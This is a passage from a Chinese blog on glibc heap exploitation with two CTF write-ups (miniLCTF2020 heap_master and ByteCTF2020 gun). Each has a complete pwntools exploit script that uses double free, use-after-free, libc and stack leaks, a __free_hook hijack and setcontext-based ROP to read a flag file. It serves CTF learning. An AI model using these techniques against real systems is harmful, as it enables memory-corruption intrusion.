<h4 id="environ"><a href="#environ" class="headerlink" title="__environ"></a>__environ</h4><p>__environ是一个保存了栈上变量地址的系统变量，位于libc中，通常情况下在没有开启地址随机化时<strong>该变量与进程的函数调用栈的间距是固定的</strong>，利用gdb调试我们可以很方便地得知其与栈上地址间的偏移，依次在栈上构造ROP链劫持程序执行流</p>
<h5 id="例题：miniLCTF2020-heap-master-tcache-double-free-use-after-free-orw"><a href="#例题：miniLCTF2020-heap-master-tcache-double-free-use-after-free-orw" class="headerlink" title="例题：miniLCTF2020 - heap_master - tcache double free(use after free) + orw"></a>例题：miniLCTF2020 - heap_master - tcache double free(use after free) + orw</h5><p> <a href="/download/minil/pwn/pwn"点击此处下载原题"">点击下载-pwn</a> </p>
<p>惯例的<code>checksec</code>，发现除了地址随机化以外都开上了</p>
<p><img src="https://i.loli.net/2020/11/15/biBCsTKHSuj4l9f.png" alt="image.png"></p>
<p>拖入IDA进行分析</p>
<p><img src="https://i.loli.net/2020/11/15/sFaTZAYb5oqDU3I.png" alt="image.png"></p>
<p>程序本身有着分配堆块、释放堆块、输出堆块内容的功能</p>
<p>我们发现在<code>delete()</code>函数中<code>free()</code>后<strong>并没有将相应堆块指针置0，存在UAF</strong></p>
<p><img src="https://i.loli.net/2020/11/15/Ua3OnZdlLFswe48.png" alt="image.png"></p>
<p>题目提示libc可能是2.23也可能是2.27，尝试<strong>直接进行double free，发现程序没有崩溃</strong>，故可知是没有double free检查的2.27的tcache</p>
<blockquote>
<p>libc2.29后tcache加入double free检查</p>
</blockquote>
<p><img src="https://i.loli.net/2020/11/15/yF7H8SBxf9mJcAb.png" alt="image.png"></p>
<p>在<code>main()</code>函数开头的<code>init()</code>函数中调用了<code>prctl()</code>函数，限制了我们不能够getshell<img src="https://i.loli.net/2020/11/19/q3Jaw8BfEYjGUNd.png" alt="image.png"></p>
<p>首先我们想到，我们可以先填满tcache，之后分配一个unsorted bin范围的chunk，通过打印该chunk的内容获取<strong>main_arena + 0x60</strong>的地址，<strong>进而获得libc的地址</strong></p>
<blockquote>
<p>libc2.27之前unsorted bin里的chunk的fd/bk似乎是指向main_arena+0x58的，现在变成main_arena+0x60了，等有时间得去看看libc2.27的源码了…</p>
</blockquote>
<p>虽然我们不能够getshell，但是依然可以通过double free进行任意地址写，<del>毕竟CTF题目的要求是得到flag，不一定要得到shell，</del>故考虑<strong>通过environ变量泄漏出栈地址后在栈上构造rop链进行orw读出flag</strong></p>
<blockquote>
<p>tips: __environ是一个保存了栈上变量地址的系统变量</p>
</blockquote>
<p>通过动态调试我们容易得到<code>___environ</code>与<code>new()</code>中的返回地址间距离为0x220，<strong>将rop链写到这个返回地址上即可接收到flag</strong></p>
<p><img src="https://i.loli.net/2020/11/20/auVAHxCbtO6IUjm.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/11/20/ULcoXK4GiISg6Vb.png" alt="image.png"></p>
<p>构造payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn'</span>) <span class="comment"># p = remote('pwn.challenge.lctf.online',10042)</span></span><br><span class="line">e = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line">note_addr = <span class="number">0x6020c0</span></span><br><span class="line">flag_addr = e.bss() + <span class="number">0x500</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size:int, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">b'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'size?'</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b'content?'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">b'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'index ?'</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">b'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'index ?'</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'what is your name? '</span>)</span><br><span class="line">    p.sendline(<span class="string">b'arttnba3'</span>)</span><br><span class="line"></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">'arttnba3'</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">'arttnba3'</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">'arttnba3'</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0xb0</span>, <span class="string">'arttnba3'</span>) <span class="comment"># idx 3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># fill the tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unsorted bin leak libc addr</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    dump(<span class="number">1</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>)) - <span class="number">0x60</span></span><br><span class="line">    malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>] <span class="comment"># 0x3cbc30</span></span><br><span class="line">    environ = libc_base + libc.sym[<span class="string">'__environ'</span>] <span class="comment"># 0x3ee098</span></span><br><span class="line">    pop_rdi_ret = libc_base + libc.search(asm(<span class="string">'pop rdi\nret'</span>)).__next__()</span><br><span class="line">    pop_rsi_ret = libc_base + libc.search(asm(<span class="string">'pop rsi\nret'</span>)).__next__()</span><br><span class="line">    pop_rdx_ret = libc_base + libc.search(asm(<span class="string">'pop rdx\nret'</span>)).__next__()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># double free in tcache 2</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite node[0]</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(note_addr)) <span class="comment"># idx 4, former 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">'arttnba3'</span>) <span class="comment"># idx 5, former 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(environ))<span class="comment"># idx 6, locate at the note[0] and overwrite it</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak stack addr</span></span><br><span class="line">    dump(<span class="number">0</span>)</span><br><span class="line">    stack_leak = u64(p.recvuntil(<span class="string">b'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">    ret = stack_leak - <span class="number">0x220</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># rop chain</span></span><br><span class="line">    payload = p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(<span class="number">4</span>) + p64(e.plt[<span class="string">'read'</span>]) <span class="comment"># read str 'flag' from input</span></span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">4</span>) + p64(libc_base + libc.sym[<span class="string">'open'</span>])<span class="comment"># open file 'flag'</span></span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(<span class="number">0x30</span>) + p64(e.plt[<span class="string">'read'</span>])<span class="comment"># read flag from file ptr 3(opened by open())</span></span><br><span class="line">    payload += p64(pop_rdi_ret) + p64(flag_addr) + p64(e.plt[<span class="string">'puts'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># double free write rop chain on stack</span></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    new(<span class="number">0xb0</span>, p64(ret))<span class="comment"># idx 7, former 3</span></span><br><span class="line">    new(<span class="number">0xb0</span>, <span class="string">'arttnba3'</span>) <span class="comment"># idx 8, former 3</span></span><br><span class="line">    new(<span class="number">0xb0</span>, payload) <span class="comment"># idx 9, locate on the stack</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the flag</span></span><br><span class="line">    p.send(<span class="string">'flag'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行脚本即得flag</p>
<p><img src="https://i.loli.net/2020/11/20/FcWrg87oXnbLCMz.png" alt="image.png"></p>
<h4 id="setcontext"><a href="#setcontext" class="headerlink" title="setcontext"></a>setcontext</h4><p>setcontext函数是libc中一个独特的函数，其中存在着一个可以让我们控制各寄存器的gadget，如下图所示（来自<a href="https://bbs.pediy.com/thread-263640.htm" target="_blank" rel="noopener">ScUpax0s -  字节跳动ByteCTF2020 两道堆题 </a>）</p>
<p><img src="https://s3.ax1x.com/2020/11/20/DQ7UyV.png" alt="DQ7UyV.png"></p>
<p>只要我们能够控制rdx寄存器指向的位置，在上面构造一个  <code>ucontext_t</code>结构体 ，执行setcontext + 61位置上的gadget，就能控制进程各寄存器的值，随后就是栈迁移 + ROP一套带走</p>
<p>通常情况下选择在堆上构造 <code>ucontext_t</code>结构体，劫持__free_hook为以下gadget（位于libc中）：</p>
<p><img src="https://i.loli.net/2021/02/10/fFBGcstHr6X9JuN.png" alt=""></p>
<h5 id="例题：bytectf2020-gun-Use-After-Free-fastbin-double-free-ORW"><a href="#例题：bytectf2020-gun-Use-After-Free-fastbin-double-free-ORW" class="headerlink" title="例题：bytectf2020 - gun - Use After Free + fastbin double free + ORW"></a>例题：bytectf2020 - gun - Use After Free + fastbin double free + ORW</h5><blockquote>
<p><del>这道题我的IDA逆出来是一堆的shit…但是看别人的wp里IDA逆出来的东西怎么都这么正常…Orz</del></p>
<p>换了IDA7.5，至少能看懂程序逻辑了XD</p>
</blockquote>
<p><a href="/download/bytectf2020/pwn/gun/gun" title="点击此处下载原题">点击下载-gun</a></p>
<p><a href="/download/bytectf2020/pwn/gun/libc-2.31.so" title="点击此处下载原题">点击下载-libc-2.31.so</a></p>
<p>惯例的<code>checksec</code>，保护全开（<del>大比赛的堆题好像都是保护全开，已经没有checksec的必要了</del>）</p>
<p><img src="https://i.loli.net/2020/12/08/Kaw5yg3udnEVMBp.png" alt="image.png"></p>
<p>拖入IDA进行分析<del>，IDA分析出一坨shit</del></p>
<p>符号表扣光，啥都看不出（悲）</p>
<p><img src="https://i.loli.net/2020/12/08/H5EqnWwVeCjIKh6.png" alt="image.png"></p>
<p>seccomp限制了一堆东西，琢磨着应该是拿不到shell了，应该还是只能走orw拿弗莱格</p>
<p><img src="https://i.loli.net/2020/12/08/EmitBpFlnNKP7X9.png" alt="image.png"></p>
<p>程序模拟了一把枪，能够射出、装载、购买子弹，其中子弹对应的就是chunk，购买子弹对应malloc</p>
<p><img src="https://i.loli.net/2021/02/05/wxq2SRUBbMs5mcl.png" alt=""></p>
<p>最多能够分配14个堆块，空间充足（x</p>
<p><img src="https://i.loli.net/2021/02/05/94rFSObq7T3h6zI.png" alt=""></p>
<p>在<code>buy()</code>函数中限制了chunk的size为0x10~0x500（似乎没什么用）</p>
<p><img src="https://i.loli.net/2021/02/06/eqmvJSHc7I3YDin.png" alt=""></p>
<p>其中<code>qword_4070</code>存放的是子弹槽对应标志位，0为该槽子弹已被射出（free），1为该槽已被使用（存放有chunk指针），2为该槽子弹已被装载（链入”弹匣“单向链表中）</p>
<p>综合起来我们不难看出其使用一个结构体来表示一个“子弹”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">INTERNAL_BULLET_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">char</span> * name;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> flag;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">INTERNAL_BULLET_</span> * <span class="title">next_bullet</span>;</span></span><br><span class="line">&#125;bullet;</span><br></pre></td></tr></table></figure>

<p>其中<code>成员name</code>储存的便是chunk指针</p>
<p>在<code>load()</code>函数中会使用头插法构建”弹匣“（单向链表），其中会使用chunk的bk指针存储原链表中头结点</p>
<p><img src="https://i.loli.net/2021/02/05/MbjAFZzscO56dhE.png" alt=""></p>
<p>在<code>shoot()</code>函数中会依次将”弹匣“链表上的”子弹”释放，随后会将该子弹的flag置0，<strong>但是没有清空其next_chunk指针，存在Use After Free漏洞，对于子弹链表的不严格检测可以导致double free</strong></p>
<p>同时shoot函数还整合了打印堆块内容的功能，利用这个功能我们可以通过再分配后二次释放的方式通过chunk上残留指针泄露栈基址与堆基址</p>
<p><img src="https://i.loli.net/2021/02/06/7FxncCbzOGshmBe.png" alt=""></p>
<p>由于题目所给的libc版本为2.31，添加了对tcache key的检测，无法直接在tcache内进行double free，故考虑<strong>先填满tcache后在fastbin内double free，后通过stash机制清空tcache使得fastbin内形如A-&gt;B-&gt;A的chunk倒入tcache中，实现任意地址写</strong>，这种做法<strong>不需要通过fastbin的size检查</strong></p>
<p>同时由于程序本身限制了系统调用，我们只能通过orw读取flag</p>
<p>考虑通过<code>setcontext()</code>中的gadget进行控制寄存器，同时我们还需要控制rdx寄存器，考虑劫持__free_hook后通过libc中如下gadget控制rdx后跳转至setcontext函数内部：</p>
<p><img src="https://i.loli.net/2021/02/10/fFBGcstHr6X9JuN.png" alt=""></p>
<p>最后通过setcontext构建的rop链orw即可，使用pwntools中的<code>SigreturnFrame()</code>可以快速构造 <code>ucontext_t</code>结构体 </p>
<p>构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./gun'</span>)</span><br><span class="line">e = ELF(<span class="string">'./gun'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.31.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(command:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b"Action&gt; "</span>)</span><br><span class="line">    p.sendline(str(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shoot</span><span class="params">(times:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Shoot time: "</span>)</span><br><span class="line">    p.sendline(str(times).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Which one do you want to load?"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span><span class="params">(size:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Bullet price: "</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"Bullet Name: "</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">b"arttnba3"</span>)</span><br><span class="line"></span><br><span class="line">    buy(<span class="number">0x10</span>, <span class="string">b"arttnba3"</span>) <span class="comment"># idx 0</span></span><br><span class="line">    buy(<span class="number">0x500</span>, <span class="string">b"arttnba3"</span>) <span class="comment"># idx 1</span></span><br><span class="line">    buy(<span class="number">0x10</span>, <span class="string">b"arttnba3"</span>) <span class="comment"># idx 2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc addr</span></span><br><span class="line">    load(<span class="number">1</span>)</span><br><span class="line">    shoot(<span class="number">1</span>)</span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">b''</span>) <span class="comment"># idx 1</span></span><br><span class="line">    load(<span class="number">1</span>)</span><br><span class="line">    shoot(<span class="number">1</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">1168</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    log.success(<span class="string">'libc base: '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the heap addr</span></span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">b'AAAAAAAAAAAAAAAA'</span>) <span class="comment"># idx 1</span></span><br><span class="line">    load(<span class="number">1</span>)</span><br><span class="line">    shoot(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b'AAAAAAAAAAAAAAAA'</span>)</span><br><span class="line">    heap_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">    log.info(<span class="string">'heap addr leak: '</span> + hex(heap_leak))</span><br><span class="line">    heap_base = heap_leak &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">    log.success(<span class="string">'heap base: '</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct the fake_frame on heap</span></span><br><span class="line">    fake_frame_addr = heap_base + <span class="number">0x310</span> + <span class="number">0x10</span></span><br><span class="line">    fake_frame = SigreturnFrame()</span><br><span class="line">    fake_frame[<span class="string">'uc_stack.ss_size'</span>] = libc_base + libc.sym[<span class="string">'setcontext'</span>] + <span class="number">61</span></span><br><span class="line">    fake_frame.rdi = <span class="number">0</span></span><br><span class="line">    fake_frame.rsi = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">    fake_frame.rdx = <span class="number">0x200</span></span><br><span class="line">    fake_frame.rsp = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">    fake_frame.rip = libc_base + libc.sym[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">    load(<span class="number">0</span>)</span><br><span class="line">    shoot(<span class="number">1</span>)</span><br><span class="line">    buy(<span class="number">0x100</span>, bytes(fake_frame))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning with fastbin double free</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        buy(<span class="number">0x20</span>, <span class="string">b'arttnba3'</span>)</span><br><span class="line">    load(<span class="number">9</span>)</span><br><span class="line">    load(<span class="number">10</span>)</span><br><span class="line">    shoot(<span class="number">2</span>)</span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">b'arttnba3'</span>) <span class="comment"># idx 9</span></span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">b'arttnba3'</span>) <span class="comment"># idx 10</span></span><br><span class="line">    load(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        load(<span class="number">3</span> + i)</span><br><span class="line">    shoot(<span class="number">7</span>)</span><br><span class="line">    load(<span class="number">10</span>)</span><br><span class="line">    load(<span class="number">9</span>)</span><br><span class="line">    shoot(<span class="number">3</span>) <span class="comment"># double free in fastbin</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        buy(<span class="number">0x20</span>, <span class="string">b'arttnba3'</span>) <span class="comment"># clear the tcache</span></span><br><span class="line">    buy(<span class="number">0x20</span>, p64(libc_base + libc.sym[<span class="string">'__free_hook'</span>])) <span class="comment"># idx 9</span></span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">b'./flag\x00'</span>) <span class="comment"># idx 10, which we use to store the flag</span></span><br><span class="line">    buy(<span class="number">0x20</span>, <span class="string">b'arttnba3'</span>) <span class="comment"># idx 11, overlapping chunk with idx 9</span></span><br><span class="line">    buy(<span class="number">0x20</span>, p64(libc_base + <span class="number">0x154930</span>)) <span class="comment"># idx12, our fake chunk on __free_hook</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct the setcontext with gadget chain</span></span><br><span class="line">    flag_addr = heap_base + <span class="number">0x570</span> + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(fake_frame_addr)<span class="comment"># rdi + 8 for the rdx, we set it to the addr of the fake frame</span></span><br><span class="line"></span><br><span class="line">    buy(<span class="number">0x100</span>, payload) <span class="comment"># idx 13</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct the orw rop chain</span></span><br><span class="line">    pop_rdi_ret = libc_base + libc.search(asm(<span class="string">'pop rdi ; ret'</span>)).__next__()</span><br><span class="line">    pop_rsi_ret = libc_base + libc.search(asm(<span class="string">'pop rsi ; ret'</span>)).__next__()</span><br><span class="line">    pop_rdx_ret = libc_base + libc.search(asm(<span class="string">'pop rdx ; ret'</span>)).__next__()</span><br><span class="line">    pop_rdx_pop_rbx_ret = libc_base + libc.search(asm(<span class="string">'pop rdx ; pop rbx ; ret'</span>)).__next__()</span><br><span class="line"></span><br><span class="line">    orw = <span class="string">b''</span></span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">4</span>) + p64(libc_base + libc.sym[<span class="string">'open'</span>])</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">'read'</span>])</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">'write'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the flag</span></span><br><span class="line">    load(<span class="number">13</span>)</span><br><span class="line">    shoot(<span class="number">1</span>)</span><br><span class="line">    p.sendline(orw)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可获得flag</p>
<p><img src="https://i.loli.net/2021/02/10/CNypQMasthTbzK9.png" alt=""></p>
<blockquote>
<p>有关setcontext()的利用见：<a href="http://blog.eonew.cn/archives/993" target="_blank" rel="noopener">setcontext 函数exploit - Ex个人博客</a></p>
</blockquote>
<blockquote>
<p>以及构造rop链时遇到了一个玄学问题…使用libc中的<code>pop rdx ; ret</code>的gadget会触发Segmentation Fault，只好改用<code>pop rdx ; pop rbx ; ret</code>的gadget来更改rdx寄存器的值…原因不明…</p>
</blockquote>
